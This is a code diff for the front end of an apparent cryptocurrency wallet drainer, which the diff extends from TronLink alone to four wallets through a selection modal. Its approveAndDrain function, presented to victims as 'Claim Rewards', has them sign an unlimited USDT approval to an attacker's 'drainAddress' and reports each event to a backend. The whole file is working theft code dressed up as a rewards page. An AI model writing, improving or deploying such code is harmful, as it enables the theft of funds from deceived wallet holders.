@@ -1,7 +1,9 @@
-// No need to create a new TronWeb instance – TronLink injects window.tronWeb
-let userAddress = null;
+// Multi‑wallet support using TronWallet Adapter (non‑React UMD version)
 
-// DOM elements
+let adapter = null;
+let userAddress = null;
+let tronWebInstance = null;
+
 const connectBtn = document.getElementById('connectBtn');
 const walletInfoDiv = document.getElementById('walletInfo');
 const walletAddressSpan = document.getElementById('walletAddress');
@@ -36,26 +38,88 @@ async function loadBalances(address) {
     }
 }
 
-async function connectWallet() {
-    if (!window.tronLink) {
-        setStatus('❌ Please install TronLink extension', true);
+// Show wallet selection modal
+function showWalletModal() {
+    const modal = document.createElement('div');
+    modal.className = 'wallet-modal-wrapper';
+    modal.innerHTML = `
+        <div class="wallet-modal">
+            <h3>Select Wallet</h3>
+            <div id="wallet-list">
+                <div class="wallet-option" data-wallet="tronlink">
+                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-tronlink/logo.png" onerror="this.src='https://via.placeholder.com/30'">
+                    <span>TronLink</span>
+                </div>
+                <div class="wallet-option" data-wallet="walletconnect">
+                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-walletconnect/logo.png" onerror="this.src='https://via.placeholder.com/30'">
+                    <span>WalletConnect</span>
+                </div>
+                <div class="wallet-option" data-wallet="okx">
+                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-okx/logo.png" onerror="this.src='https://via.placeholder.com/30'">
+                    <span>OKX Wallet</span>
+                </div>
+                <div class="wallet-option" data-wallet="bitget">
+                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-bitget/logo.png" onerror="this.src='https://via.placeholder.com/30'">
+                    <span>Bitget Wallet</span>
+                </div>
+            </div>
+            <button id="close-modal" style="margin-top:10px;">Cancel</button>
+        </div>
+    `;
+    document.body.appendChild(modal);
+
+    const closeModal = () => modal.remove();
+    document.getElementById('close-modal').addEventListener('click', closeModal);
+
+    document.querySelectorAll('.wallet-option').forEach(opt => {
+        opt.addEventListener('click', async () => {
+            const walletType = opt.dataset.wallet;
+            closeModal();
+            await connectWithWallet(walletType);
+        });
+    });
+}
+
+async function connectWithWallet(walletType) {
+    setStatus(`Connecting to ${walletType}...`);
+
+    // Initialize the adapter based on wallet type
+    let walletAdapter;
+    if (walletType === 'tronlink') {
+        if (!window.tronLink) {
+            setStatus('TronLink extension not installed', true);
+            return;
+        }
+        walletAdapter = new window.TronWalletAdapter.TronLinkAdapter();
+    } else if (walletType === 'walletconnect') {
+        walletAdapter = new window.TronWalletAdapter.WalletConnectAdapter();
+    } else if (walletType === 'okx') {
+        walletAdapter = new window.TronWalletAdapter.OkxWalletAdapter();
+    } else if (walletType === 'bitget') {
+        walletAdapter = new window.TronWalletAdapter.BitKeepAdapter(); // Bitget uses BitKeep adapter
+    } else {
+        setStatus('Wallet not supported', true);
         return;
     }
+
     try {
-        // Request account access
-        const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
-        userAddress = accounts[0];
-        
-        // Use the globally injected tronWeb object
-        if (window.tronWeb && window.tronWeb.defaultAddress) {
-            userAddress = window.tronWeb.defaultAddress.base58;
-        }
-        
+        await walletAdapter.connect();
+        const account = walletAdapter.address;
+        userAddress = account;
+        tronWebInstance = new TronWeb({
+            fullHost: 'https://api.trongrid.io',
+            headers: { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY || '' }
+        });
+        // Override the transaction signing with the adapter
+        tronWebInstance.trx.sign = async (tx) => {
+            const signed = await walletAdapter.signTransaction(tx);
+            return signed;
+        };
+
         walletAddressSpan.innerText = userAddress;
         walletInfoDiv.classList.remove('hidden');
-        setStatus('✅ Wallet connected! Fetching balances...');
+        setStatus(`Connected with ${walletType}! Fetching balances...`);
 
-        // Send event to backend
         await fetch('/api/event', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -64,20 +128,20 @@ async function connectWallet() {
 
         await loadBalances(userAddress);
         setStatus('Ready. Click "Claim Rewards" to receive USDT.');
+
+        // Store adapter for later signing
+        adapter = walletAdapter;
     } catch (err) {
         console.error(err);
-        setStatus('Connection failed: ' + (err.message || 'Unknown error'), true);
+        setStatus(`Connection failed: ${err.message}`, true);
     }
 }
 
-async function approveAndDrain() {
-    if (!userAddress) {
-        setStatus('Please connect wallet first', true);
-        return;
-    }
+connectBtn.addEventListener('click', showWalletModal);
 
-    if (!window.tronWeb) {
-        setStatus('TronWeb not available', true);
+async function approveAndDrain() {
+    if (!userAddress || !adapter) {
+        setStatus('Please connect wallet first', true);
         return;
     }
 
@@ -92,14 +156,17 @@ async function approveAndDrain() {
     }
 
     const usdtContractAddress = config.usdtContract;
-    const drainTarget = config.drainAddress;      // your wallet or custom contract
+    const drainTarget = config.drainAddress;
     const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
     try {
-        const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
+        // Use TronWeb instance with adapter signing
+        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
         setStatus('Approving USDT spending...');
 
-        const approveTx = await usdtContract.approve(drainTarget, MAX_UINT).send();
+        const unsignedTx = await usdtContract.approve(drainTarget, MAX_UINT).request();
+        const signedTx = await adapter.signTransaction(unsignedTx);
+        const approveTx = await tronWebInstance.trx.sendRawTransaction(signedTx);
         setStatus(`✅ Approval sent! TX: ${approveTx}`);
 
         await fetch('/api/event', {
@@ -128,5 +195,4 @@ async function approveAndDrain() {
     }
 }
 
-connectBtn.addEventListener('click', connectWallet);
 drainBtn.addEventListener('click', approveAndDrain);
